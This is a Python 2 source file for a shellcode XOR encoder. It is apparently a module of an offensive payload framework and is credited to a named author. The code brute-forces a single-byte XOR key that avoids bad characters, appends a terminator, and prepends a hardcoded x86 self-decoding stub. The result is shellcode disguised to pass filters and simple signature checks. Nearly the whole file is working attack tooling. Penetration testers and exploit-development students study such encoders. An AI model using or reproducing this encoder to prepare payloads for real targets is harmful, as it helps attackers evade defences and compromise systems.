#!/usr/bin/env python

# This xor encoder was developed completely by Justin Warner (@sixdub)
# Thanks a lot for letting us add this in!

import re
import sys


class EncoderModule:

    def __init__(self, shellcode, bad_chars=r"\x00"):
        self.author = "Justin Warner (@sixdub)"
        self.xor_key = 0x00
        self.shellcode = bytearray(shellcode.replace("\\x", "").decode("hex"))
        self.terminator = 0x00
        self.encoded_shellcode = ""
        self.encoded_payload_length = 0
        self.encoder_bad_chars = ["eb", "18", "5e", "8d", "3e", "31", "c0", "db", "8a", "1c", "06", "80", "f3", "88", "1f", "47", "40", "ef", "e8", "e3", "ff"]
        self.bad_chars = bad_chars
        self.set_bad_characters(bad_chars)
        self.do_the_magic()

    def have_bad_chars(self, incoming, chars):
        for b in chars:
            if b in incoming:
                return True
        return False

    def shellcode_to_ascii(self, shell_code):
        output = ""
        for b in shell_code:
            output += "\\x%02x" % b
        return output

    def set_bad_characters(self, bad_characters):
        if bad_characters is not None:
            final_bad_chars = []
            #bad_characters = bad_characters.split('x')
            bad_characters = bad_characters.split("\\x")
            bad_characters = bad_characters[1:] 

            # Do some validation on the received characters
            for item in bad_characters:
                if item == '':
                    pass
                else:
                    if len(item) == 2:
                        # Thanks rohan (@cptjesus) for providing this regex code, and making me too lazy
                        # to do it myself
                        rohan_re_code = re.compile('[a-f0-9]{2}', flags=re.IGNORECASE)
                        if rohan_re_code.match(item):
                            final_bad_chars.append(item)
            self.bad_chars = [int("0x" + x, 16) for x in final_bad_chars]

    # Takes a blob as input with a single byte key and returns blob output
    def xor(self, x, key):
        output = bytearray("")
        for b in bytearray(x):
            output.append(b ^ key)
        return output

    def do_the_magic(self):
        # This is where the encoding happens
        encode = bytearray("")

        # Test all possible keys and see if it creates a bad char. If not, we have a winner!
        remove_count = 0
        for test_key in range(1, 255):
            if not self.have_bad_chars(self.xor(self.shellcode, test_key), self.bad_chars):
                self.xor_key = test_key
                break
            else:
                remove_count += 1

        # Ensure a key was found... if not, error out
        if self.xor_key == 0x00:
            print "[*] ERROR: No key found... Stop being so picky and change your bad chars!"
            exit
        else:
            # XOR all the things
            # Justin, your code comments are awesome
            for x in bytearray(self.shellcode):
                encode.append(x ^ self.xor_key)
            skipped_term = 0

            # Iterate over code to find a non-used terminating char
            # that is not a badchar
            for i in range(1, 255):
                if i in bytearray(encode) or i in self.bad_chars:
                    skipped_term += 1
                else:
                    self.terminator = i
                    break

            # Build final payload with stub
            encode.append(self.terminator)
            decodestub = bytearray("\xeb\x18\x5e\x8d\x3e\x31\xc0\x31\xdb\x8a\x1c\x06\x80\xfb")
            decodestub.append(self.terminator)
            decodestub += bytearray("\x74\x0e\x80\xf3")
            decodestub.append(self.xor_key)
            decodestub += bytearray("\x88\x1f\x47\x40\xeb\xef\xe8\xe3\xff\xff\xff")
            complete = decodestub + encode
            self.encoded_payload_length = len(complete)

            # At this point, the shellcode is a byte array... now we convert to ASCII
            self.encoded_shellcode = self.shellcode_to_ascii(complete)
            return self.encoded_shellcode
